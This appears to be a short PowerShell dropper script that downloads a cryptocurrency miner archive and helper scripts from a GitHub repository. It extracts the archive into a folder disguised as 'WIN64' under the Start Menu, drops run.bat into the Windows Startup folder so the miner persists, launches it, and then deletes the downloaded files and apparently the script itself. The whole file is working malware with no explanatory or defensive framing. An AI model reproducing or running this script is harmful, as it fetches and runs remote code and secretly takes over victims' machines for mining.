Invoke-WebRequest -Uri "https://github.com/OneOdioAddict/Miner/blob/main/miner.zip?raw=true" -OutFile "miner.zip" -Force
Expand-Archive -LiteralPath "miner.zip" -DestinationPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\WIN64" -Force
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/win64.ps1" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\win64.ps1" -Force
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/run.bat" -OutFile "run.bat" -Force
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/run.bat" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\run.bat" -Force
Start-Process -FilePath ".\run.bat"
Start-Sleep -Seconds 3
Remove-Item "miner.zip"
Remove-Item "miner.ps1"
Remove-Item "run.bat"
